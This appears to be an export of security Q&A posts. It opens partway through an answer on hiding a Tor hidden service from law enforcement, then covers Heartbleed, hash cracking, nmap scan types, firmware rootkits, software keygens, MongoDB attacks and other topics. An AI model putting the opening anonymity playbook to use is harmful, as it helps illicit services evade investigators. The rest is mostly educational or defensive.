<li><p>Hosts leased from third parties are convenient but especially vulnerable to attacks where the service provider takes a copy of the hard drives. If the server is virtual, or it is physical but uses RAID storage, this can be done without taking the server offline. Again, do not lease cloud space, and carefully monitor the hardware of the physical host. If the RAID array shows as degraded, or if the server is inexplicably down for more than a few moments, the server should be considered compromised, since there is no way to distinguish between a simple hardware failure and a compromise of this nature.</p></li>
<li><p>Ensure that your hosting provider offers 24x7 access to a remote console (in the hosting industry this is often called a <a href=""https://en.wikipedia.org/wiki/KVM_switch"" rel=""nofollow noreferrer"">KVM</a> though it's usually implemented via <a href=""https://en.wikipedia.org/wiki/Intelligent_Platform_Management_Interface"" rel=""nofollow noreferrer"">IPMI</a>) which can also install the operating system. Use temporary passwords/passphrases during the installation, and change them all after you have Tor up and running (see below). Use only such a tool which is accessible via a secured (https) connection, such as Dell iDRAC or HP iLO. If possible, change the SSL certificate on the iDRAC/iLO to one you generate yourself, as the default certificates and private keys are well known.</p>

<p>The remote console also allows you to run a fully encrypted physical host, reducing the risk of data loss through physical compromise; however, in this case the passphrase must be changed every time you reboot the system (even this does not mitigate all possible attacks, but it does buy you time).</p>

<p>If the system was rebooted without your knowledge or explicit intent, consider it compromised and do not attempt to decrypt it in this manner. Silk Road 2.0 apparently failed to encrypt its hard drives, and also failed to move service when it went down in May 2014, when it was taken offline by law enforcement to be copied.</p></li>
<li><p>Your initial setup of the hosts which will run the service must be in part over clearnet (via a Tor exit node), albeit via ssh and https; however, to reiterate, they must not be done from home or from a location you have ever visited before. As we have seen, it is not sufficient to simply use a VPN. This may cause you issues with actually signing up for the service due to fraud protection that such providers may use. How to deal with this is outside the scope of this answer, though.</p></li>
<li><p>Once you <em>have</em> Tor up and running, never connect to any of the servers or virtual machines via clearnet again. Configure hidden services which connect via ssh to each host and each of the virtual machines, and always use them. If you run multiple servers, do not allow them to talk <em>to each other</em> over the clearnet; have them access each other via unique Tor hidden services. If you must connect via clearnet to resolve a problem, again, do so from a location you will never visit again. Pretty much any situation which would require you to connect via clearnet indicates a possible compromise; consider abandoning it and moving service instead.</p></li>
<li><p>Hidden services must be moved occasionally, even if compromise is not suspected. A 2013 paper described <a href=""http://www.ieee-security.org/TC/SP2013/papers/4977a080.pdf"" rel=""nofollow noreferrer"">an attack which can locate a hidden service</a> in just a few months for around $10,000 in cloud compute charges, which is well within the budget of even some individuals. As noted earlier, a similar attack took place in early 2014 and may have been involved in the November 2014 compromise of dozens of hidden services. How often is best to physically move the hidden service is an open question; it may be anywhere from a few days to a few weeks. My best guess right now is that the sweet spot will be somewhere between 30 to 60 days. While this is an extremely inconvenient timeframe, it is much less inconvenient than a prison cell. Note that it will take <a href=""https://tor.stackexchange.com/q/13/201"">approximately an hour</a> for the Tor network to recognize the new location of a moved hidden service.</p></li>
</ol>

<hr>

<h1>Conclusion</h1>

<p>Anonymity is <em>hard</em>. Technology alone, no matter how good it is, will never be enough. It requires a clear mind and careful attention to detail, as well as real-world actions to mitigate weaknesses that cannot be addressed through technology alone. As has been so frequently mentioned, the attackers can be bumbling fools who only have sheer luck to rely on, but you only have to make one mistake to be ruined.</p>

<p>The guidelines I have given above are intended to make it harder, more time-consuming and more expensive for attackers to locate you or your service, and whenever possible to give you warning that you or your service may be under attack. </p>

<p>We call them ""advanced persistent threats"" because, in part, they are <em>persistent</em>. As the US attorney Preet Bharara said announcing the Silk Road 2.0 raid, ""We don't get tired."" They won't give up, and you must not.</p>

<hr>

<h1>Further reading</h1>

<ul>
<li><a href=""https://firstlook.org/theintercept/2015/07/14/communicating-secret-watched/"" rel=""nofollow noreferrer"">Chatting in Secret While We're All Being Watched</a>
Mostly good advice from one of the journalists who communicated with Edward Snowden. The only part I can really disagree with is the possibility of using your existing operating system or smartphone for communication. As we've seen already, this cannot be done safely, and you must prepare a computer with something like Whonix or Tails.</li>
<li><a href=""http://freehaven.net/anonbib/"" rel=""nofollow noreferrer"">Selected Papers in Anonymity</a> An extensive collection of anonymity-related research, some of which has been presented here. Go through this to get a feel for just how difficult remaining anonymous really is.</li>
</ul>
","43485"
"Which services are affected by Heartbleed?","22614","","<p>I have to admit that I'm confused as to which services exactly are affected by Heartbleed. I have read <a href=""http://heartbleed.com"">http://heartbleed.com</a> but all I read is that OpenSSL is affected. Great, but I don't really know where OpenSSL is used.</p>

<p>So concretely, are these services affected:</p>

<ul>
<li>HTTPS (OK this one I think I know the answer)</li>
<li>SSH</li>
<li>HTTP</li>
<li>others?</li>
</ul>

<p>If I have a server which doesn't provide HTTPS (only HTTP), does that mean the server can't be affected by the bug?</p>
","<p>It is hard to say <em>exactly</em> which apps/services are affected. This is because OpenSSL is a collection of programming code (referred to as a ""library"") that can be used to add TLS support to an application or system. TLS (Transport Layer Security) provides secure connections, and is best known for being the security layer behind HTTPS websites.</p>

<p>So if a programmer were writing a program that needed to use TLS to connect to something, they can use the OpenSSL library to add that ability to their app.</p>

<p>The OpenSSL library itself is constantly being improved, like many other bits of software. During this process, the Heartbleed bug was accidentally introduced in OpenSSL version 1.0.1, which was released on 14th of March 2012. It remained present through to version 1.0.1f (inclusive) and was fixed in 1.0.1g, released on 7th of April 2014  .</p>

<p>This means that any application that uses <em>those</em> OpenSSL versions for TLS is potentially affected. No doubt the affected developers have fixes in progress.</p>

<p>The fix has since been ""backported"", meaning that it has been added to versions of OpenSSL prior to 1.0.1g. This is a <em>good</em> thing, and is commonly done for vulnerabilities, but has the side effect of making it harder to tell if an app is vulnerable (since you can't tell just by looking at the OpenSSL version).</p>

<p>To address your specific questions:</p>

<ul>
<li>SSH is not affected (SSH is a different protocol to TLS)  </li>
<li>HTTP is not affected (HTTP is also a different protocol to TLS), meaning that a HTTP-only server will not be affected.</li>
<li>Note that it's possible to provide HTTPS using other libraries - so Microsoft IIS Web Servers (which don't use OpenSSL) can provide HTTPS without being affected.</li>
</ul>

<p>So in summary:</p>

<p><strong>The only apps/services that are affected are those that use a vulnerable version of OpenSSL for TLS connections, <em>and</em> have TLS heartbeat support.</strong></p>

<ul>
<li><p>Other TLS libraries (like GnuTLS, SChannel, and JSSE) <em>cannot</em> possibly be affected by this particular bug, because it only exists in specific versions of the OpenSSL library.</p></li>
<li><p>If you are unsure, ask the person/company that wrote the application.</p></li>
<li><p>If you are a developer, find out what library your app is using for TLS connections and <a href=""https://security.stackexchange.com/questions/55249"">test</a> to be certain.</p></li>
</ul>
","55219"
"Is it possible to crack hash with known salt? If yes how?","22608","","<p>If the salt in the hash is known to us, then is it possible to crack to extract the password from the hash? If yes, how?</p>
","<p>Hash functions are designed to go only one way. If you have a password, you can easily turn it into a hash, but if you have the hash, the only way to get the original password back is by brute force, trying all possible passwords to find one that would generate the hash that you have. Assuming the salt is very long, not knowing the salt would make it nearly impossible to crack (due to the additional length that the salt adds to the password), but you still have to brute force even if you do know the salt.</p>

<p>As an example, let's say that the password is ""secret"" and the salt is ""535743"". If the salt is simply appended to the end of the password, then the hash you'd be cracking would be a hash of the string ""secret535743"". Without knowing the hash, you'd have to try all possibilities until you reach ""secret535743"", which would take quite a while due to its length (keeping in mind that real salts are much longer than this).</p>

<p>But if you know that the salt is 535743 and that it is appended to the end of the password, then instead of trying everything, you'd try ""a535743"", ""b535743"", ""c535743"", etc. This greatly reduces the number of possibilities you have to try until you reach the correct string.</p>

<p>With that being said, it is generally quite rare to have a situation where you know the hash but not the salt since both are usually stored in the same place.</p>
","88727"
"Is Truecrypt still safe?","22598","","<p>I want to fully encrypt a disk on Windows 7, but I don't trust Bitlocker and Truecrypt has announced it is not safe (also many rumours about NSA being able to decrypt it and it's better to avoid it).</p>

<p>So what can I use? Open source is better, and what is the most secure encryption combination today?</p>

<p>I see many people still use Truecrypt. Are they at risk of anyone easily accessing their data?</p>
","<p><strong>Edit: October 3, 2015</strong> An <a href=""http://www.itworld.com/article/2987438/data-protection/newly-found-truecrypt-flaw-allows-full-system-compromise.html"">article in <em>IT World</em> for September 29, 2015</a> reveals the existence of, but doesn't describe fully, two serious flaws in the Windows driver that TrueCrypt installed.  It isn't clear from the article whether those flaws compromise the crypto or the underlying Windows OS, or both.  It also isn't clear whether that driver is installed only for full-disk encryption or at any time a TrueCrypt volume is in use.</p>

<p><strong>Original answer below:</strong></p>

<p>Older versions of Truecrypt are as safe as they ever were.  Unhappily, the safety of older versions has not been conclusively demonstrated, I think.  A <a href=""https://opencryptoaudit.org/"">code audit</a> by others, of which phase one is complete, did not find any problems that significantly weaken the crypto algorithms, and I really doubt anyone, even the NSA, can crack AES unless there's a back door that hasn't been found.  (That's a back door in Truecrypt; I'm relatively sure that AES itself is safe.)</p>

<p>That said, I am still trusting an older install of Truecrypt.  For you to use Truecrypt, you'd have to put your hands on an old copy of the software.  There is what purports to be a copy of <a href=""https://github.com/AuditProject/truecrypt-verified-mirror?files=1"">Truecrypt 7.1</a> on Github.  The Open Crypto Audit Project says it is verified, and I have no reason to doubt that.</p>

<p>There is also an open source successor, <a href=""https://veracrypt.codeplex.com/"">VeraCrypt</a>, which I have not tried.</p>
","77198"
"Is removing the Ethernet cable from the router (when I'm not using it) a good security measure?","22581","","<p>I have here at home a router, like many people out there.
The router is connected with an Ethernet cable that comes from the modem.</p>

<p>But, to prevent hackers or anything else to try bothering me, if I'm not using the router, is removing the Ethernet cable a good security measure? Or it doesn't do that much in security, so I should leave it always connected?</p>
","<p>If there is not an internet connection to your device then a hacker is not going to be able to communicate with that device. (Edit: As some have pointed out...this is assuming an attacker is attempting over the internet from a remote location)</p>

<p>With that said, eventually you will have to connect to the internet again if you want to use the internet and if you were to eventually obtain malware on your computer such as a keylogger. That keylogger is going to rely on the internet to send its data back to the hacker. If the keylogger is written properly, when you disconnect, it will just wait for you to connect to the internet again to send its data back to the attacker.</p>

<p>In my opinion, I think disconnecting from your internet will prove to be more of a hassle than a protection. Instead, focus on the security of your device and your actions on the internet. Being a smart internet user can provide a great deal of security to your device.</p>

<p>Elaboration (EDIT):</p>

<p>I do agree that this method with decrease the time of opportunity for an attacker but the reason I chose to put emphasis on endpoint security and user education is because if you imagine an enterprise environment, they have devices and services that rely on an internet connection 24/7. So an enterprise can't rely on disconnecting from the internet as a viable security measure. Instead they focus on securing the devices on the network and the network itself. So I believe this will achieve 2 things: 1) greater security. 2) better user experience(always have internet access on demand) and I believe you can apply these strategies to your personal network as well.</p>
","154316"
"Why do phishing emails have spelling and grammar mistakes?","22576","","<p>Are the spelling and grammar mistakes in phishing emails done on purpose? Is there some wisdom behind it? Or they are simply indicative of the fact that they've been written by someone who does not natively speak English?</p>
","<p>This may well be for the same reason as many scammers rely on the tired old 'Nigerian Prince' strategy: <a href=""http://research.microsoft.com/pubs/167719/WhyFromNigeria.pdf"">by self-selecting for gullible targets, they can be more efficient</a>.</p>

<p>In phishing, as in scams, sending the initial batch of emails is the easy part.  The hard part is coaxing information out of the target (which can require a concerted exchange of emails).  That can represent a significant investment of time.</p>

<p>As a result, it's really important to ensure that the people you correspond with may actually give you the information that you're after.  It can therefore be advantageous to send a badly-drafted email, on the basis that the people who respond to that are likely to be gullible enough to be phished.</p>

<p>(I would probably draw a distinction between these broad, drag-net approaches and targeted phishing, where you're much more likely to see carefully-crafted and legitimate-looking emails.)</p>
","96154"
"What layer is TLS?","22568","","<p>TLS stands for ""<em>transport</em> layer security"".  And the <a href=""https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers"">list of IP protocol numbers</a> includes ""TLSP"" as ""Transport Layer Security Protocol"".  These two things would leave me to believe that TLS is a transport layer protocol.</p>

<p>However, most people seem to talk about TLS over TCP.  Wikipedia lists it as an ""application layer"" protocol.  This is further complicated by the fact that TCP doesn't have anything like a protocol number: it just packages up raw bytes, so how do you parse out that you are getting a TLS packet, vs a packet that just starts with <code>0x14</code> - <code>0x18</code> or equivalent?</p>
","<p>The <a href=""https://en.wikipedia.org/wiki/OSI_model"">OSI model</a>, that categorizes communication protocols into successive layers, is just that: a <em>model</em>. It is an attempt at pushing a physical reality into neatly defined labelled boxes. Nobody ever guaranteed that it works...</p>

<p>Historically, that model was built and published when the ISO was pushing for adoption of its own <a href=""https://en.wikipedia.org/wiki/OSI_protocols"">network protocols</a>. They lost. The World, as a whole, preferred to use the much more simple <a href=""https://en.wikipedia.org/wiki/Internet_protocol_suite"">TCP/IP</a>. The ""model"" survived the death of its initial ecosystem, and many people have tried to apply it to TCP/IP. It is even commonly taught that way. However, the model does not match well TCP/IP. Some things don't fit in the layers, and SSL/TLS is one of them.</p>

<p>If you look at the protocol details:</p>

<ul>
<li>SSL/TLS <em>uses</em> an underlying transport medium that provides a bidirectional stream of bytes. That would put it somewhere <em>above</em> layer 4.</li>
<li>SSL/TLS organizes data as records, that may contain, in particular, handshake messages. Handshake messages look like layer 5. This would put SSL/TLS at layer 6 or 7.</li>
<li>However, what SSL/TLS conveys is ""application data"", which is, in fact, a bidirectional stream of bytes. Applications that use SSL/TLS really use it as a <em>transport</em> protocol. They then use their own data representation and messages and semantics within that ""application data"". Therefore, SSL/TLS cannot be, in the OSI model, beyond layer 4.</li>
</ul>

<p>Thus, in the OSI model, SSL/TLS must be in layer 6 or 7, and, <em>at the same time</em>, in layer 4 or below. The conclusion is unescapable: the OSI model does not work with SSL/TLS. TLS is not in any layer.</p>

<p>(This does not prevent some people from arbitrarily pushing TLS in a layer. Since it has no practical impact -- this is just a model -- you can conceptually declare that TLS is layer 2, 5, or 17; it won't be proven false.)</p>
","93338"
"Why does an nmap -sT scan show ports filtered but -sS shows ports closed","22564","","<p>What are possible reasons why an <code>nmap -sT</code> scan would show ""ports filtered"" but an identical <code>nmap -sS</code> scan shows ""ports closed""? I understand that <code>-sT</code> is a full TCP Connect, which is easier to detect (and to filter) than the <code>-sS</code> half open scan. But why? </p>

<p>Both types of scans send a SYN packet; both types of scans should expect back a SYN|ACK or a RST. The only difference that I see is that the half open scan will send a RST instead of finishing the connection handshake. </p>

<p>Also, I ran the command <code>nmap -sT -P0</code> which tells nmap not to send a ping first (I think it typically does both a TCP ping and an ICMP ping). Doing that command causes it to respond with ""ports closed"" which is identical to the <code>-sS</code> scan response. Is that because <code>-sT</code> is normally being blocked due to pinging first? </p>

<p>That's my assumption, but I want some more experienced opinions about what I am seeing and what types of scans I can do to investigate further. Btw, I am of course allowed to be doing these scans (class work).</p>
","<p>If you saved Nmap's XML output, there is an attribute of the <code>&lt;state&gt;</code> tag called <code>reason</code>, which will give you the reason Nmap chose to label a port closed, open, or filtered. This is usually something like ""reset"", ""conn-refused"", ""syn-ack"", or ""port-unreach"", depending on the kind of scan and the state of the port. This information can also be viewed in ""normal"" output by using the <code>--reason</code> flag or setting <code>-d</code> for debugging.</p>

<p>A common misconception is that the SYN scan (<code>-sS</code>) is ""more stealthy"" than the TCP Connect scan (<code>-sT</code>). At one time, and from one point of view, this was true: that is, from the perspective of the application running on the host. Back in the day, before IDS and stateful firewalls, your best indication of a port scan was application logs showing connections that were opened and immediately closed. The SYN scan, because it tears down the connection before it leaves the kernel, never crosses into the application, so these logs are not written. From the point of view of the network, however, the behavior of a half-open SYN scan (SYN, SYN-ACK, RST) is quite unusual, and can be a significant indicator of a port scan, even if only one, open port is scanned. In this case (scanning a small number of ports likely to be open, protected by IDS), the TCP Connect scan may actually be ""stealthier.""</p>

<p><code>-Pn</code> (formerly known as <code>-P0</code> and <code>-PN</code>) instructs Nmap to skip the host discovery phase, and instead assume that all hosts are up. <a href=""http://nmap.org/book/man-host-discovery.html"">The details of host discovery</a> are well-documented, but it is possible that this behavior is triggering an adaptive firewall on the host. Adaptive firewalls can be tricky, since you get a variety of responses depending on your behavior and the speed of the scan. I would recommend slowing the scan with any of the <a href=""http://nmap.org/book/man-performance.html"">timing options</a> and reducing the number of ports scanned to a handful, until you get consistent results.</p>
","31189"
"Can a computer virus be stored somewhere else than on the hard drive?","22556","","<p>Are there viruses that have managed to hide themselves somewhere other than on the hard drive? Like CPU cache or on the motherboard? </p>

<p>Is it even possible? Say I get a virus, so I get rid of the HDD and install a new one. Could the virus still be on my PC?</p>
","<p>Plenty of places:</p>

<ul>
<li>BIOS / UEFI - <a href=""https://www.blackhat.com/presentations/bh-usa-07/Heasman/Presentation/bh-usa-07-heasman.pdf"">BlackHat presentation</a> (PDF)</li>
<li>System Management Mode (SMM) such as Intel Management Engine (IME) - <a href=""http://phrack.org/issues/66/11.html"">Phrack article</a>.</li>
<li>GPUs - <a href=""https://github.com/x0r1/jellyfish"">Proof of concept rootkit on GitHub</a>.</li>
<li>Network cards - <a href=""http://esec-lab.sogeti.com/static/publications/11-recon-nicreverse_slides.pdf"">Recon 2011 presentation</a> (PDF)</li>
<li><a href=""http://invisiblethingslab.com/resources/misc09/Quest%20To%20The%20Core%20(public).pdf"">A Quest To The Core</a> (PDF) - a good presentation covering everything from BIOS to SMM to microcode.</li>
</ul>

<p>Modern hardware has a wide range of persistent data stores, usually used for firmware. It's far too expensive to ship a complex device like a GPU or network card and put the firmware on a <a href=""https://en.wikipedia.org/wiki/Mask_ROM"">mask ROM</a> where it can't be updated, then have a fault cause mass  recalls. As such you need two things: a writeable location for that firmware, and a way to put the new firmware in place. This means the operating system software must be able to write to where the firmware is stored in the hardware (usually EEPROMs).</p>

<p>A good example of this is the state of modern BIOS/UEFI update utilities. You can take a UEFI image and an executable running on your OS (e.g. Windows), click a button, and your UEFI updates. Simple! If you reverse engineer how these work (which I have done a few times) it's mostly a case of a kernel-mode driver being loaded which takes page data from the given UEFI image and talks directly to the UEFI chip using the <a href=""http://x86.renejeschke.de/html/file_module_x86_id_222.html""><code>out</code></a> instruction, sending the correct commands to unlock the flash and start the update process.</p>

<p>There are some protections, of course. Most BIOS / UEFI images won't load unless they're signed by the vendor. Of course, an advanced enough attacker might just steal the signing key from the vendor, but that's going into conspiracy theories and godlike threat actors, which just aren't realistic to fight in almost any scenario. Management engines like IME are meant to have certain protections which prevent their memory sections from being accessed even by ring0 code, but research has shown that there are many mistakes out there, and lots of weaknesses.</p>

<p>So, everything is screwed, right? Well, yes and no. It's <em>possible</em> to put rootkits in hardware, but it's also incredibly difficult. Each individual computer has such a variance in hardware and firmware versions that it's impossible to build a generic rootkit for most things. You can't just get a generic Asus BIOS and flash it to any board; you'll kill it. You'd need to create a rootkit for each separate board type, sometimes down to the correct revision range. It's also an area of security that involves a huge amount of cross-domain knowledge, way down deep to the hardware and low-level operational aspects of modern computing platforms, alongside strong security and cryptographic knowledge, so not many people are capable.</p>

<p>Are you likely to be targeted? No.</p>

<p>Are you likely to get infected with a BIOS/UEFI/SMM/GPU/NIC-resident rootkit? No.</p>

<p>The complexities and variances involved are just too great for the average user to ever realistically have to worry about it. Even from an economic perspective, these things take an inordinate amount of skill and effort and money to build, so burning them on consumer malware is idiotic. These kinds of threats are so targeted that they only ever really belong in the nation-state threat model.</p>
","121107"
"How do software keygens work?","22485","","<p>I have seen them plenty of times, with many different types of software, but the one thing I have always wondered, is how software keygens know what key to generate. I know the basic principle of it: the keygen looks somewhere in the software installation files and creates a key that matches some encrypted file which allows the program to work. But I wanted to know how they do that, and how to prevent it. This is really a multiple part question.  </p>

<blockquote>
  <ol>
  <li><strong>How does the key-system work?</strong>
  <ul>
  <li>How do programmers usually create software that works based on a key. I am an intermediate programmer, but I never learned much of the security/anti-piracy aspect of it. How do they create and/or recognize the keys to allow the software to start working?</li>
  </ul></li>
  <li><p><strong>Where does it usually look to find this ""encrypted file""?</strong> </p>
  
  <ul>
  <li>Is it in a physical file on the computer, or an of-site database that it calls?</li>
  </ul></li>
  <li><p><strong>What do the companies do to encrypt that file?</strong></p>
  
  <ul>
  <li>I would emagine that the key must be stored in more than just plaintext, what do they do to keep it encrypted?</li>
  </ul></li>
  <li><strong>What method is the keygen using to create the key?</strong>
  <ul>
  <li>I have played around a llitle with some password-cracker software such as ""cain &amp; able"" and I have noticed, that with some of the password-cracking methods, such as brute-force and dictionary, it gives me ETAs in years, however keygens seem to create keys instantly. Are they using different methods entirely?</li>
  </ul></li>
  <li><strong>What measures can companies take to prevent the use of keygens in pirated software?</strong>
  <ul>
  <li>I am starting to write my own software to be distributed, I was wondering what existing, relitivly easy methods can I use to prevent </li>
  </ul></li>
  </ol>
</blockquote>
","<h1>How does the key-system work?</h1>

<p>Well it depends there are many implementations. One of them was discussed in <a href=""https://stackoverflow.com/questions/599837/how-to-generate-and-validate-a-software-license-key"">stackoverflow</a>:</p>

<p>Assuming you don't want to do a special build for each user, then:</p>

<ul>
<li>Generate yourself a secret key for the product</li>
<li>Take the user's name</li>
<li>Concatentate the users name and the secret key and hash with (for example) SHA1</li>
<li>Unpack the SHA1 hash as an alphanumeric string. This is the individual user's ""Product Key""</li>
<li>Within the program, do the same hash, and compare with the product key. If equal, OK.</li>
</ul>

<p>Note: every key scheme can be cracked. That's why a lot of tools use online validation.</p>

<h1>Where does it usually look to find this ""encrypted file""?</h1>

<p>There usually is no encrypted file when using the previous method. There might be other methods to generate keys with another algorithm, but they never store all keys in the program.</p>

<h1>What do the companies do to encrypt that file?</h1>

<p>Well if you are referring to storing the key the user typed in your system, then sometimes it's saved plaintext in a config file. Sometimes they use symetric (like AES) encryption with a hardcoded key to encrypt this file. </p>

<h1>What method is the keygen using to create the key?</h1>

<p>Because there are people that can figure out the scheme the program uses and just implement it in their own keygen.</p>

<h1>What measures can companies take to prevent the use of keygens in pirated software?</h1>

<p>Online activation, but the harder you make it for the customer to use the software the less likely you they will buy it. In the end there isn't a single piece of software that is <em>piracy-proof</em>. If there was, companies like Adobe and Microsoft would be hiring you instantly.</p>
","13344"
"TLS_RSA_WITH_3DES_EDE_CBC_SHA reported as 112 bits","22438","","<p>I am no expert in this area but after some searching I am not too sure about the solution. </p>

<p>An external vendor doing a pentration test on our server reported that we have TLS_RSA_WITH_3DES_EDE_CBC_SHA with 112 bits enabled and reported that as a threat. I have read that such ciphers can be disabled from the <a href=""https://support.microsoft.com/en-us/kb/245030"">Microsoft site</a> (We are on Windows Server 2008) which is great but after reading a bit more about what this means on a <a href=""https://devcentral.f5.com/questions/des-cbc3-sha-listed-as-192-bits-but-ssl-labs-reports-as-112-bit"">forum</a> I see that it is a downgrade from 168 due to a vulnability.</p>

<p>Extract:</p>

<blockquote>
  <p>I'm not a crypto-nerd but if I read this explanation correctly that particular cipher has an effective security of 112 bits but if the encryption is achieved by using 3 56 bit keys (3 X 56 = 168)</p>
</blockquote>

<p>Answer:</p>

<blockquote>
  <p>""One might expect that 3TDEA would provide 56×3 = 168 bits of strength. However, there is an attack on 3TDEA that reduces the strength to the work that would be involved in exhausting a 112 bit key""</p>
</blockquote>

<p>I can confirm that SSLLabs do infact rate this cipher to be 112 not 168 which I presume is due to the vulnability.</p>

<p>in this <a href=""https://devcentral.f5.com/questions/ssllabs-a-f5-ltm-114"">forum</a> entry it is mentioned to be related to OpenSSL</p>

<blockquote>
  <p>As an update, as of the June 20 snapshot of the OpenSSL codebase, the reported strength of the 3DES Cipher Suites is now 112 bits instead of 168.</p>
</blockquote>

<p>Ok. If this is correct then can this downgrade only apply to certificates issued with OpenSSL? I an not sure what the exact vulnerability is causing the downgrade to 112.</p>

<p>Either way, what is the actual approach to disable this. should I set the Registry key (Enabled = 0x0) under the following subkeys?:</p>

<pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers\
Triple DES 112/112
</code></pre>

<p>or:</p>

<pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers\
Triple DES 168/168
</code></pre>

<p>or both, or something else?</p>

<p>I cannot apply the change myself as i do not have permissions on these servers, but I need to instruct the person who will make the change.</p>
","<p>You should disable both, because the double DES keys (DES ABA) have even less than 112 bit security, rather around 80 bits or so.</p>

<p>There is a difference between the key size in memory - including overhead like parity bits (192 bits), the bits used of the key (168 bits), the intended security of the key (112 bits) and the actual security given the attacks possible on the cipher (still 112 bits). The figures between parentheses is for triple DES keys (DES ABC)</p>

<p>For double DES keys you will come to 128 bits / 112 bits / 112 bits and 80 (!) bits.</p>

<p>AES 128 has a actual security of around 126 bits so it should be strongly preferred. It's also much faster than 3DES and is widely supported, so disabling 3DES altogether should be the preferred option - unless you are certain that clients will fail.</p>

<p>Notes:</p>

<ul>
<li>the strength of the symmetric cipher used in TLS has nothing to do with the certificate used</li>
<li>the 112 bits of security is because of a <a href=""https://crypto.stackexchange.com/questions/16073/why-is-triple-des-not-vulnerable-to-meet-in-the-middle-attacks"">meet-in-the-middle attack which was already known when 3DES was designed</a>, so 112 bit is the <em>intended strength</em> of 3DES</li>
</ul>
","103993"
"Best practice to block Dropbox usage","22427","","<p>We have users sync their data at company with their home computer. 
What's the best way to block it?</p>

<ul>
<li>Block *.dropbox.com</li>
<li>Find out all dropbox IPs and block IPs.</li>
<li>For windows users, deploy GPO to prevent dropbox installation.</li>
</ul>
","<p>Using Dropbox is not inherently a greater security risk than other methods of data transfer.  I work at a security consulting firm and we often use Dropbox to move encrypted archives to our clients.  We also use SFTP,  but this seems to be problematic for some of our clients.</p>

<p>A better policy is that all company data must be encrypted at rest.  This policy should include company laptops, servers, cloud services and anywhere else you maybe storing company data.  Make sure you educate your employees about storing and transferring data in a secure manner.  Blocking Dropbox may have adverse effects,  such as forcing employees to use less secure methods of transferring data.  I have found that employees will find creative ways of doing their job,  and its not always secure.</p>
","24722"
"What type of attacks can be used vs MongoDB?","22390","","<p>I'm starting to learn MongoDB and was curious if it was susceptible to some type of injection attack similar to <a href=""http://en.wikipedia.org/wiki/SQL_injection"">SQLi</a>. Due to the nature of the DB, I don't <em>think</em> you can inject into it but... What other type of attacks can be leveraged against MongoDB?</p>
","<p><a href=""https://www.owasp.org/index.php/Top_10_2010-A4-Insecure_Direct_Object_References"">Insecure Direct Object Reference</a></p>

<p><a href=""http://cwe.mitre.org/data/definitions/602.html"">Client-Side Enforcement of Server Side Security</a></p>

<p><a href=""http://nosql.mypopescu.com/post/14453905385/attacking-nosql-and-node-js-server-side-javascript"">Server-Side JavaScript Injection</a></p>

<p>Also MongoDB should not be assessable to the public.  It can be password protected,  and passwords can be brute-forced.  Client-Side js can communicate with MongoDB directly,  and MongoDB can authenticate individual users. However their authentication system is overly simplistic,  and in practice I have only seen this design fail.</p>
","23738"
"What is a salami attack?","22378","","<p>Can someone give a clear definition of a Salami Attack? In the book Security in Computing (4th Edition) by Charles P. Pfleeger.</p>

<p>It is stated as a attack to data integrity and I quote the passage:</p>

<p><strong>Data Integrity</strong></p>

<blockquote>
  <p>Stealing, buying, finding, or hearing data requires no computer sophistication, whereas modifying or
  fabricating new data requires some understanding of the technology by which the data are
  transmitted or stored, as well as the format in which the data are maintained. Thus, a higher level</p>
  
  <p>The most common sources of this kind of problem are malicious programs, errant file system
  utilities, and flawed communication facilities.Data are especially vulnerable to modification. Small and skillfully done modifications may not be
  detected in ordinary ways. For instance, we saw in our truncated interest example that a criminal
  can perform what is known as a <strong>salami attack</strong>: <em>The crook shaves a little from many accounts and
  puts these shavings together to form a valuable result, like the meat scraps joined in a salami.</em></p>
</blockquote>

<p>Can someone give me a better definition of What is a Salami Attack? And what are the Methods to prevent it? </p>
","<p>Nope, I don't think @munkeyoto has got the right idea.</p>

<p>The following passage is from Bruce Schneier's Secret And Lies.</p>

<blockquote>
  <p>There’s the so-called salami attack of stealing the fractions of
  pennies, one slice at a time, from everyone’s interest-bearing
  accounts; this is a beautiful example of something that just would not
  have been possible without computers.</p>
</blockquote>

<p>A salami attack is a small attack that can be <strong>repeated</strong> many times very efficiently. Thus the combined output of the attack is great. In the example above, it refers to stealing the round-off from interest in bank accounts. Even though it is less than 1 cent per account, when multiplied by millions of accounts over many months, the adversary can retrieve quite a large amount. It is also less likely to be noticable since your average customer would assume that the amount was rounded down to the nearest cent.</p>

<p>The chained exploits that munkeyoto is referring to is a series of <strong>different</strong> exploits each having a small impact but when combined, has a large impact.  </p>
","76093"
"How can I block an IP, if I'm getting many http requests in a second?","22321","","<p>If some one tried force burst attack on my website, how can I block them?</p>

<p>Ideally, I want to block an IP if I have many http/Apache requests in a second.</p>
","<p>fail2ban can be configured to do this. You can configure it to trigger on a regex match in a logfile and if it happens too many times per minute (not sure if it goes to second resolution but just multiply whatever you were thinking per second by 60) and it can drop the client IP into the iptables packet filter or whatever other action you want taken. Or you can use the iptables recent module and adapt what I've done here for SIP brute force attacks to use with your web server:</p>

<p><a href=""http://tracyreed.org/blog/2010/12/26/sip-brute-force-attacks"">http://tracyreed.org/blog/2010/12/26/sip-brute-force-attacks</a></p>
","35774"
"How is Facebook locating me when I use a VPN?","22320","","<p>I am using a private VPN network for my internet connection. But it seems that if I go to <a href=""http://m.facebook.com"">http://m.facebook.com</a> and try to check in, Facebook sees my location properly.</p>

<p>My IP address seems to be from USA.</p>

<p>I have cleared all the cookies. If Facebook can't determine the current location it uses the old one instead,that seems the only explanation I have? How is this done? </p>
","<p>If you are using the Facebook app on your phone then you have already agreed to let the app access location services. </p>

<p>Accessing Facebook through the browser on your phone will ask for your location like this:</p>

<blockquote>
  <p>m.facebook.com wants to use your device's location</p>
</blockquote>

<p>The IP address will indicate a very rough location like a city or region. The <strong>check-in feature</strong> uses precise locations provided by the location service of your phone. Location services use GSM base station ID data, WIFI SSIDs, MAC addresses and the GPS location if available. The phone will then query a server on the internet using the GSM and WIFI data in order to get precise location information. It is similar on a computer although computers typically only have WIFI.</p>

<p>So you must have allowed Facebook access to this kind of location data. IP addreses and foreign VPNs have nothing to do with precise location data.</p>

<p>Chrome has started <a href=""http://googlechromereleases.blogspot.com/2010/03/dev-channel-update.html"">implementing</a> <a href=""http://www.w3.org/TR/geolocation-API/"">Geolocation API</a> since 2010:</p>

<blockquote>
  <p>Wifi based location is only supported on Windows and Mac</p>
</blockquote>

